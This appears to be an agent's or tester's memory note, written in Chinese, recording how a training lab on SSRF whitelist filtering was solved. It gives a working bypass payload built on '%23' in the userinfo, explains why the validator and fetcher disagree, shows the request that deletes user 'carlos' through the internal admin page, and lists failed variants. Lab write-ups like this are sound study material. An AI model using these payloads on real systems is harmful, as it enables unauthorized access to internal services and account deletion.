---
metadata:
  node_type: memory
name: "SSRF Whitelist Filter Bypass"
description: "SSRF whitelist bypass: http://localhost%23@stock.weliketoshop.net:8080/admin (validator decodes %23 once, fetcher does not)"
last_updated: 2026-10-10T12:55:28+08:00
created: 2026-10-10T12:55:28+08:00
---

## 2026-02-14 lab-ssrf-with-whitelist-filter (arm A, solved)

- 目标:`/product/stock` 的 `stockApi` 字段,白名单要求 host 为 `stock.weliketoshop.net`;基线 `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` 返回 311。
- 拒绝特征:400 `"External stock check host must be stock.weliketoshop.net"` —— host 取自解析器;常规 userinfo 变体 `http://stock.weliketoshop.net:8080@localhost/admin` 同样被拒,说明校验器解析 host 是正确的。
- 命中载荷:`http://localhost%23@stock.weliketoshop.net:8080/admin` → 200,返回内网 admin 页。
  - 机理:校验器先把 `%23` 解码为 `#`,于是 host 落在白名单主机上(片段被忽略);实际取数使用未解码的原始串,`%23` 成了 userinfo 里的普通字符,最后一个 `@` 之后才是真实主机 → 请求真发往 `localhost`。校验串与取数串的编码层次差即成功条件。
- 利用:同法请求 `http://localhost%23@stock.weliketoshop.net:8080/admin/delete?username=carlos` → 302 Location `/admin`,banner 翻牌 solved:true。
- 全批被拒的反例:`%23` 顺序颠倒的 `http://stock.weliketoshop.net:8080%23@localhost/admin`、双重编码 `%2523`、`#` 字面量。
